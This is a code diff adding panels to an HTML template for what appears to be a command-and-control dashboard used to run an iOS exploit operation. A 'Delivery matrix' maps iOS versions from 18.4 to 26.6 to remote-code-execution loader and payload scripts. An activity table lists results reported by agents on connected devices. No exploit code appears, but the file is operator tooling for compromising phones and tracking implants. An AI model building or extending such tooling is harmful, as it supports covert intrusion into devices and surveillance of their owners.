@@ -41,6 +41,44 @@
     </section>
 
     <section class="panel">
+      <header><h2>Delivery matrix</h2>
+        <span class="muted" style="font-size:.8rem">which chain each iOS build takes</span>
+      </header>
+      <table class="hz">
+        <thead><tr><th>iOS</th><th>Route</th><th>Payload</th></tr></thead>
+        <tbody>
+          <tr><td>18.4</td><td>rce_loader.js</td><td>rce_worker_18.4.js</td></tr>
+          <tr><td>18.5</td><td>rce_loader.js</td><td>rce_worker_18.6.js / rce_module_18.5.js</td></tr>
+          <tr><td>18.6</td><td>rce_loader.js</td><td>rce_worker_18.6.js / rce_module.js</td></tr>
+          <tr><td>18.7</td><td>rce_loader.js</td><td>rce_worker_18.7.js</td></tr>
+          <tr><td>26.0 - 26.3</td><td>loader_26_deploy.js</td><td>rce_worker_26.3.js</td></tr>
+          <tr><td>26.4 - 26.6</td><td>loader_26_deploy.js</td><td>rce_worker_26.5.js</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="panel">
+      <header><h2>Recent activity</h2>
+        <span class="muted" style="font-size:.8rem">latest results reported by agents</span>
+      </header>
+      <table class="hz">
+        <thead><tr><th>Device</th><th>Task</th><th>Status</th><th>Received</th></tr></thead>
+        <tbody>
+        {% for r in activity %}
+          <tr>
+            <td>{{ r.device }}</td>
+            <td>{{ r.type }}</td>
+            <td>{{ r.status }}</td>
+            <td>{{ r.at }}</td>
+          </tr>
+        {% else %}
+          <tr><td colspan="4" class="muted">No activity yet.</td></tr>
+        {% endfor %}
+        </tbody>
+      </table>
+    </section>
+
+    <section class="panel">
       <header><h2>Connected devices</h2>
         <div class="hz-btn-group">
           <span class="muted" style="font-size:.8rem">live from the C2 store</span>
